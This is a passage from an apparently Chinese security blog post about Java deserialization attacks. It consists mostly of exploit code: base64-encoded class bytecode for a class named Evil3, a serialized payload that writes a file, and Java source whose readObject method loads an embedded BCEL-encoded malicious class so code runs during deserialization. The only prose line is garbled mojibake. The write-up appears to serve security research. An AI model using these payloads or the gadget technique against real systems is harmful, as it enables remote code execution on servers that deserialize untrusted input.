NlbC9pbnRlcm5hbC91dGlsL0NsYXNzTG9hZGVyDACGAIcBAAlsb2FkQ2xhc3MMAIgAiQcAigwAiwCMDABvAI0BABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABkoTGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQALd3JpdGVPYmplY3QBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAC3RvQnl0ZUFycmF5AQAEKClbQgEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEABmVuY29kZQEABihbQilbQgEABShbQilWAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAUKClMamF2YS9sYW5nL09iamVjdDsAIQAeAAYAAQAfAAAAAwABACAAIQABACIAAAAvAAEAAQAAAAUqtwABsQAAAAIAIwAAAAYAAQAAAAoAJAAAAAwAAQAAAAUAJQAmAAAACQAnACgAAQAiAAAA9wAFAAUAAABOEgK4AANMKwO9AAS2AAUDvQAGtgAHTbsACFm3AAlOuwAKWS23AAs6BBkELLYADLIADbsADlm4AA8ttgAQtgARtwAStgATpwAITCu2ABWxAAEAAABFAEgAFAAEACMAAAAqAAoAAAANAAYADgAWAA8AHgAQACgAEQAuABIARQAWAEgAFABJABUATQAXACQAAAA+AAYABgA/ACkAKgABABYALwArACwAAgAeACcALQAuAAMAKAAdAC8AMAAEAEkABAAxADIAAQAAAE4AMwA0AAAANQAAAAwAAQAGAD8AKQA2AAEANwAAAAkAAvcASAcAOAQAAgA5ADoAAgAiAAAAygAGAAYAAABIEhZNEhe4AAMDvQAEtgAFA70ABrYAB8AAGE4ttgAZEhoEvQAEWQMSDlO2ABs6BBkELQS9AAZZAyxTtgAcwAAEOgUZBbYAHVexAAAAAwAjAAAAGgAGAAAAGQADABsAGgAeAC4AIQBBACIARwAjACQAAAA+AAYAAABIACUAJgAAAAAASAA7ADwAAQADAEUAPQA+AAIAGgAuAD8AQAADAC4AGgBBAEIABABBAAcAQwAqAAUANQAAAAwAAQBBAAcAQwA2AAUARAAAAAQAAQAUAAIARQAAAAIARgB6AAAACgABAFkAVgB5AAk=&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> age = <span class="string">&quot;yv66vgAAADQAdAoABgAtCAAuCgAEAC8HADAKAAQAMQcAMgoAMwA0BwA1CgAIAC0HADYKAAoANwoACgA4CQA5ADoHADsKADwAPQoACAA+CgA/AEAKAA4AQQoAQgBDBwBECgAUAEUIAEYIAEcHAEgKAAYASQgASgoABABLCgBMAE0KAAQATgcALgcATwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEADVN0YWNrTWFwVGFibGUHAEQBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBAApFdmlsMy5qYXZhDAAgACEBAAVFdmlsMwwAUABRAQAPamF2YS9sYW5nL0NsYXNzDABSAFMBABBqYXZhL2xhbmcvT2JqZWN0BwBUDABVAFYBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAGmphdmEvaW8vT2JqZWN0T3V0cHV0U3RyZWFtDAAgAFcMAFgAWQcAWgwAWwBcAQAQamF2YS9sYW5nL1N0cmluZwcAXQwAXgBhDABiAGMHAGQMAGUAZgwAIABnBwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABrACEBDX8kJEJDRUwkJCRsJDhiJEkkQSRBJEEkQSRBJEEkQSQ4ZFYkNWJXJFRXJFUkZmUkOGUkcSQ5OWEkWUQkQyRJJGYxUiRjMWskNDBNJGM0JGJiJDQwJGFkJElYJGFjJEIkYWRBJHYkYTJtJDg3JGUxJEEkRCQ5MyQ5OTgzJEIkYjQkZjckN2JrbyRmNmZrJGVkJGNkJGRhJGQ2diRmNSRjOSQ5NyRlOGokOTckYWUkM2UkZjckYTEkN2QkZTlrJDlmJGZhJGQ0JGJlJGY0JGwkZDQkZWUkOTNJNCRSJGFjZSR6JGY2OWdfJGNlJGRlJGZiJGRiJDdiJDlmJGNjJGNmJGZmJGZjcCREJGMwViQ3YyRhNyRhMCRpJDg3JFUkM2MkOGMkYzMkODIkcWUkTSR1OCQ4MiRhMzIkRyRyJDNjJGEyJDQwJGMyJDkwJDg0YyRLJDg2cSQ1YyRjNiRKJFokOGYkY2F4TCRjNiRlMzI0JG4kaCQ5MSRhMSRjYiRZJDk1JGMwJDg1JGM2JDk4JDhjcSRaJFQkSyRNTCR3JGE4JGMxJDk0JE1TJGFjJHYkWiQ5NiRNJDViRlo4JDNiJHYkYzMkOTEkZTAkdyRmMCQ5MCRSZFokYzEkTWYkVjQkZTIkOTQkOGMkZDNiJDdkQiQ5MCR0ZSQzYyRyJGUzaSRKJGNmJHVoJGMxJGIzJFMkOWVjJEl1JFkkOTYkZTEkZWRmJHUkOGI2JGxlJEl0JGQ5JGEzJDljJGExJHdhWCRiYyQzZiQ5MyRnJGUxJGNlJDgwNmIkUyR0JDljJGIwdSRjZCQzYyRhYTkkODY4JGU3JDk5JEJvJGMycCRaViR0bGckM2MkY2VnJGI1VCRkYSRlNHEkY2RNcyRkZCQ5YiQ5YyRlMSRkYTR3JGUyJDdiJGJieiRTJDNkJGZhJDg0JGRkJGNlJG13JGU4ZiRkZSRkOSQ4MiRlOU0kTSRkNSQ4OUltWiQ4YiQ5YiQ5YTUkayRlZjI1JGQ3bSRYJDgyViQ4NiRyRSRDJDg3JDhmJDk5dCQ1ZCRiYyQ4ZiQ3YiRUJGY2aE5jJGIzJDg4JGU2JGI2JGM2JGMxJDkxSVIkYzhJJGI2JEkkYjJVJDkwbSQ4MmwkWGQkODckbSQzYiRGJGQ5VWokOTckZjQkaSRjMyRnJHQkYmIkYjIkZTlWJDhhJGE2ZngkM2VZcFpzWiR2JGE0JGJhJG9hJGNmJGFjJGNlJGQzJDllYSQ1YiRxJGFmTHokOWEkM2UkZDUkYTckYTVzJDg4UHkkciQzY08kYzUkYTUkZWFJJGU4JHMkYTAkWiQ5NCRhNCQ5ZHF0JGJlJGNmJFEkODBVJFckZTAkODgkODkkZWJUbERMJGMyJEwkdyQ1ZSRjNEskdyQ1ZSRjNiR4JE0kaiRFZSRjY00kTCRmN2MkOGUkOTYkZTIzJGI2MyRWJDliJGUxJHAxJGRkJGI2JDNjJDNlJGViJGM1JGkkN2UyJGMzJDVkJF92JGQ4XyRiYiQ3Y3YkYWZtJDhlciRlYSQ4MVdVJGJjJDg2MyRNJGI1JGUzJGRjJGNia3R6JDk0JGNjSCRjNiRlM1QkYTkkYWEkM2IkUVckZjEkM2EkZGUkNjBYdCR0JDlhJDk0JDg1JDhhNyRmMSRXJGMzJDllJGZmJGhPJDkyJDNiJGQzJGU2JGJjTiR4ciRiMSRiOGkkZGJyJEokQyRlNXZkJE0kY2IkODUkZTMkZDkkOTgkZWIkZGIkZGUkYmUkYTMkYTAkNWNOJGNhJDgzJDhlJGUxcUckYzUkZGIkbyRkMjUkYTUkRyRUJDllJDk3JDhlJGY1JFMkdiRmNSRlZSRoJGY2ciQ4ZDAkdiRjOSRjZSRhZiRhYiQ4YSRiM3gkODckZWEkYWUkYTdGJFokcSRkYiQ4ZFkkOTQkOTgkODR3VSRiYyQ4NyRmN1UkN2MkODBzJHEkaSRkYyRkZiRhZiRlMkMkN2NEJDlkJFQkZDdJJHokM2ViWHF3JDgyJDhlJGh1JFYkZTckZjExJGYxJEUkeSQ5ZWlRJHgkZTckNWNkJDNjJGMzJDhjJHR1JGNkJGIyRCR2JCQkYTgkZjgkRSQ5ZiRhYSRmOCRNJDlmSyRmOEIkYzVFJDdjJHYkSyQ3ZSQ4OW44JGRlJGE5JGUyJHgkN2MkYWQkZTIkaCRlMSR3OGZmJGM0JGM1QSRkZCRiNCR6SiRiYWYkOWVWU3EkWiRkZjIkYWMkYmMkZjckYTAxNCRkY216SiRhMCRZJDk4cCRJJGxqSSQzZCRlMzgkZGMkZjIkSyRlNyRkYWhzJGUyTiR6aiRmNCQzYSRDNCRkZmskYjkkY2VJJGQ4JDNlJGI4JDkxJFMkZjUkbyQ5MSRiMCQ5OVckNDAkYzUxaSQ5MyRlM1BBJGEzcyRjN24kY2UkOGQkZWQkN2VBJExZJGVjJDk5JGM3ZngkOGVNJGYzJDdmJGJkJG8kbiRjMyQ5YSRiNiRhNyRJJGVjJDVkJGQxJGI5TyRjOSRmMCQ1Y1YkZjMkN2MkUE41JGM1JGQ0JGNkdVNzJGY4aCRuJGI2SiQ5NyQ3YiQ5ZCRiYSRjZSQ1ZCRkNyRmMCQ5ZiRjOCRlODEkZjEkYWUkVyRmNyRlMCR2JGQ3JGUzJHYkN2YkeSRPOXYkOWEkM2IkZGUkdiQ4NiRiNSRmNyRjMCRlMSRkNiQ4YlQkZTEkZDlHJGQyZCRkNCRhNSQ4OSRCJHYkYWQkZDYkeiRyWUwkYTdmWCRFJGYwJGQyJGUyJDhiJGJiJHM0JHQkdmYkYzQkZDJ5JDdiJGYzMVIkVWUkZjUkeFEzJGI3JDkyJGVkJDg1JGNlJGNlJGIxJE9nJHkkY2ZIJFZGJGI4cCRhOCR4MSRjYiRiMyRjOTAkYzBnOSRjZE00JDNhJGNmJGJiWmxBJFEkSSRiNEokNWQkZTUkOTkkTSRMJGM5JGQ1JDdlJHgkOWQkZjEkYzgkOTJrJDg0WiQ3ZCRjMSQ5ZGEkYzckOGIkRWQkZGUkUSQ5ZFckbSRkMFczJCQkZWYkZTYkYTYkOTEkUyRfJEokYzMkYmEkYmJjJDVkJDNjJGMyJG8kSiQ4YiRmYSQ5ZCQ4YUpRJGU0JGskZmEkQkckZDMkdiRlNyRjNmhzaVYkRlEkOGYkYzlTNEskZWRoJGMyJEckZmEkNWQkVyQ3ZiRMJGMwJGM0M080TiRhNzgkYWQkOGMkZDYkNjAkY2JVJGIwJHg5JGYxJHMkYTIkYTEkaTMkODRWJGEyJGFhJGFmJDgwJGNkJGQ4QiRhYkwkbCRVeSRlMyRGJGRmJGQzJDk1JFYkQSRkMyRhZmFBJFdlJGUxJDQwJFckYzEkRCR6JGUxUCRkOXVIWSRjOCQ4OSRmNSQ4Y3YkZTVZJHUkN2R5JDg1JEtfQSR6JHUkYjQkODQkeCRmMyRkYiRmZSRmNSRoJGYyJGJhbSQ4MSQ4ZCRiNyRiNiRjMSRiYyRkZEIkYjIkTFckZjkkYWEkOGIkZGFCeW4kYjUkZTAkODYkRCRjNCRqJHckTCRkNyRxJDg1SCQ4YUgkVURtJHEkZTQkZDNIJGEwcCQ5MyRpJDkxJG9BUiR6JHQkZDUkM2FSVSQ3ZUJNJDVieSRlOCQzYVEkciRiYyRmOCRnJGVhJGIzaCRJRyRiMlhyJGskZTEkODgkb3Qkb0okbSRiYzR5JFpVJGUyJGI4JHl3JDVjTjQkWSR2T0YkZTQkeSRlZSRMJGFmJHUkZjYkaSQ5MSRmZCRjYiQ3ZkQkZTMkZDA1NEUkOTQkeVZmJGIxJGVhJHdWJDg3JGQ3ZCRiMTYkOGJ1JGMyJGU5JGEwbyRaJGNkZyRTJDkxJGYzJGUxJGU1JGY5JGNkcyRmOCQ5N1EkN2UkYTAkciQ4YiRmNSQ4M1dEJFIkZDgkUSQzYk4kbEplJGI5JFM5WEYkYjQkOWMkY2EkYTMkYTAkOWUkY2EkZDAkRSRmMSQ5YVdiJHQkVyRhMiRMVSRlOCRjNyRvJE0kYTEkZzYkYzI4Q19oZ1EkOGJzJGE4JGMzJHIkeSRHJGU1JDhiJGhoJGMwJF8kODgk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&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">UserBean</span> userBean = <span class="keyword">new</span> <span class="title class_">UserBean</span>(<span class="string">&quot;Evil3.class&quot;</span>,age,o);</span><br><span class="line">        byte[] bytes = <span class="title function_">serialize</span>(userBean);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="title class_">ByteArrayOutputStream</span> baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.<span class="title function_">toByteArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%205.png" alt="image.png"></p><p>Êñá‰ª∂ÂÜôÂÖ•ÊàêÂäüÂêéÁª≠Âà©Áî®ÂèçÂ∫èÂàóÂåñËß¶ÂèëÂÜôÂÖ•ÁöÑÂ≠óËäÇÁ†Å</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">util</span>.<span class="property">ClassLoader</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectInputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">Serializable</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Method</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Evil3</span> implements <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Class</span>&lt;?&gt; evilClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;Evil3&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> evilInstance = evilClass.<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line">            <span class="title class_">ByteArrayOutputStream</span> btout = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="title class_">ObjectOutputStream</span> objOut = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">            objOut.<span class="title function_">writeObject</span>(evilInstance);</span><br><span class="line">            <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encode</span>(btout.<span class="title function_">toByteArray</span>())));</span><br><span class="line">            <span class="comment">//deserialize(btout.toByteArray());</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="keyword">void</span> <span class="title function_">readObject</span>(<span class="title class_">ObjectInputStream</span> ois) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">String</span> code = <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$5bW$TW$U$fe$8e$q$99a$YD$C$I$f1R$c1k$40M$c4$bb$40$ad$IX$ac$B$adA$v$a2m$87$e1$A$D$93$9983$B$b4$f7$7bko$f6fk$ed$cd$da$d6v$f5$c9$97$e8j$97$ae$3e$f7$a1$7d$e9k$9f$fa$d4$be$f4$l$d4$ee$93I4$R$ace$z$f69g_$ce$de$fb$db$7b$9f$cc$cf$ff$fcp$D$c0V$7c$a7$a0$i$87$U$3c$8c$c3$82$qe$M$u8$82$a32$G$r$3c$a2$40$c2$90$84c$K$86q$5c$c6$J$Z$8f$caxL$c6$e324$n$h$91$a1$cb$Y$95$c0$85$c6$98$8cq$Z$T$K$ML$w$a8$c1$94$MS$ac$v$Z$96$M$5bFZ8$3b$v$c3$91$e0$w$f0$90$RdZ$c1$Mf$V4$e2$94$8c$d3b$7dB$90$te$3c$r$e3i$J$cf$uh$c1$b3$S$9ec$Iu$Y$96$e1$edf$u$8b6$le$It$d9$a3$9c$a1$waX$bc$3f$93$g$e1$ce$806b$S$t$9c$b0u$cd$3c$aa9$868$e7$99$Bo$c2p$ZV$tlg$3c$ceg$b5T$da$e4q$cdMs$dd$9b$9c$e1$da4w$e2$7b$bbz$S$3d$fa$84$dd$ce$mw$e8f$de$d9$82$e9M$M$d5$89ImZ$8b$9b$9a5$k$ef25$d7m$X$82V$86$rE$C$87$8f$99t$5d$bc$8f$7b$T$f6hNc$b3$88$e6$b6$c6$c1$91IR$c8I$b6$I$b2U$90m$82l$Xd$87$m$3b$F$d9Uj$97$f4$i$c3$g$t$bb$b2$e9V$8a$a6fx$3eYpZsZ$v$a4$ba$oa$cf$ac$ce$d3$9ea$5b$q$afLz$9a$3e$d5$a7$a5s$88Py$r$3cO$c5$a5$eaI$e8$s$a0$Z$94$a4$9dqt$be$cf$Q$80U$W$e0$88$89$ebTlDL$c2$L$w$5e$c4K$w$5e$c6$x$M$j$Ee$ccM$L$f7c$8e$96$e23$b63$V$9b$e1$p1$dd$b6$3c$3e$eb$c5$i$7e2$c3$5d$_v$d8_$bb$7cv$afm$8er$ea$81WU$bc$863$M$b5$e3$dc$cbktz$94$ccH$c6$e3T$a9$aa$3b$QW$f1$3a$de$60Xt$t$9a$94$85$8a7$f1$W$c3$9e$ff$hO$92$3b$d3$e6$bcN$xr$b1$b8i$dbr$J$C$e5vd$M$cb$85$e3$d9$98$eb$db$de$be$a3$a0$5cN$ca$83$8e$e1qG$c5$db$o$d25$a5$G$T$9e$97$8e$f5$S$v$f5$ee$h$f6r$8d0$v$c9$ce$af$ab$8a$b3x$87$ea$ae$a7F$Z$q$db$8dY$94$98$84wU$bc$87$f7U$7c$80s$q$i$dc$df$af$e2C$7cD$9d$T$d7I$z$3ebXqw$82$8e$hu$V$e7$f11$f1$E$y$9eiQ$x$e7$5cd$3c$c3$8c$tu$cd$b2D$v$$$a8$f8$E$9f$aa$f8$M$9fK$f8B$c5E$7c$v$K$7e$89n8$de$a9$e2$x$7c$ad$e2$h$e1$w8ff$c4$c5A$dd$b4$zJ$baf$9eVSq$Z$df2$ac$bc$f7$a014$dcmzJ$a0$Y$98p$I$ljI$3d$e38$dc$f2$K$e7$dahs$e2N$zj$f4$3a$C4$dfk$b9$ceI$d8$3e$b8$91$S$f5$o$91$b0$99W$40$c51i$93$e3PA$a3s$c7n$ce$8d$ed$7eA$LY$ec$99$c7fx$8eM$f3$7f$bd$o$n$c3$9a$b6$a7$I$ec$5d$d1$b9O$c9$f0$5cV$f3$7c$PN5$c5$d4$cduSs$f8h$n$b6J$97$7b$9d$ba$ce$5d$d7$f0$9f$c8$e81$f1$ae$W$f7$e0$v$d7$e3$v$7f$y$O9v$9a$3b$de$v$86$b5$f7$c0$e1$d6$8bT$e1$d9G$d2d$d4$a5$89$B$v$ad$d6$z$rYL$a7fX$E$f0$d2$e2$8b$bb$s4$t$vf$c4$d2y$7b$f31R$Ue$f5$xQ3$b7$92$ed$85$ce$ce$b1$Og$y$cfH$VF$b8p$a8$x1$cb$b3$c90$c0g9$cdM4$3a$cf$bbZlA$Q$I$b4J$5d$e5$99$M$L$c9$d5$7e$x$9d$f1$c8$92k$84Z$7d$c1$9da$c7$8b$Ed$de$Q$9dW$m$d0W3$$$ef$e6$a6$91$S$_$J$c3$ba$bbc$5d$3c$c2$o$J$8b$fa$9d$8aJQ$e4$k$fa$BG$d3$v$e7$c6hsiV$FQ$8f$c9S4K$edh$c2$G$fa$5d$W$7f$L$c0$c43O4N$a78$ad$8c$d6$60$cbU$b0$x9$f1$s$a2$a1$i3$84V$a2$aa$af$80$cd$d8B$abL$l$Uy$e3$F$df$d3$95$V$A$d3$afaA$We$e1$40$W$c1$D$z$e1P$d9uHY$c8$89$f5$8cv$e5Y$u$7dy$85$K_A$z$u$b4$84$x$f3$db$fe$f5$h$f2$bam$81$8d$b7$b6$c1$bc$ddB$b2$LW$f9$aa$8b$daByn$b5$e0$86$D$c4$j$w$L$d7$q$85H$8aH$UDm$q$e4$d3H$a0p$93$i$91$oAR$z$t$d5$3aRU$7eBM$5by$e8$3aQ$r$bc$f8$g$ea$b3h$IG$b2Xr$k$e1$88$ot$oJ$m$bc4y$ZU$e2$b8$yw$5cN4$Y$vOF$e4$y$ee$L$af$u$f6$i$91$fd$cb$7fD$e3$d054E$94$yVf$b1$ea$wV$87$d7d$b16$8bu$c2$e9$a0o$Z$cdg$S$91$f3$e1$e5$f9$cds$f8$97Q$7e$a0$r$8b$f5$83WD$R$d8$Q$3bN$lJe$b9$S9XF$b4$9c$ca$a3$a0$9e$ca$d0$E$f1$9aWb$t$W$a2$LU$e8$c7$o$M$a1$g6$c28C_hgQ$8bs$a8$c3$r$y$G$e5$8b$hh$c0$_$88$e07$y$c1$eft$d7$lX$8e$3f$b1$C$7f$a3$915$a3$89ub$r$h$c2$g$f2$b8$8a$9d$c0j6$82$b5$b9v8M$7eT$d6$87m$d8N$a7z$b6$X$3b$c8$t$p$8b$9d$d8$856j$a0$$$b6$Y$ed$c4$xC$3f$ab$40$H$f1$C$Y$a2$f0$ef$a7$5d$90$e2$f9$L$bbI$g$a2$a8$7e$c5$D$b4$93$u$a6$y$f6$90T$a6$c8$$$a2$T$7b$v$af$h$b8$40ytC$n$efA$f4$60$ly$7b$90$fe$b7$pp$93$C$ae$90$d0$xa$bf$84$87$K$d4$df$f8$fb$D$S$S$40$c5MB$89$60$93$d0$X$a4$I$fbs$ed$7d$f0_g$f9j$k$Y$L$A$A&quot;</span>;</span><br><span class="line">        <span class="comment">//new ClassLoader().loadClass(code).newInstance();</span></span><br><span class="line">        <span class="title class_">ClassLoader</span> classLoader = (<span class="title class_">ClassLoader</span>) <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>).<span class="title function_">getDeclaredConstructor</span>().<span class="title function_">newInstance</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Method</span> loadClassMethod = classLoader.<span 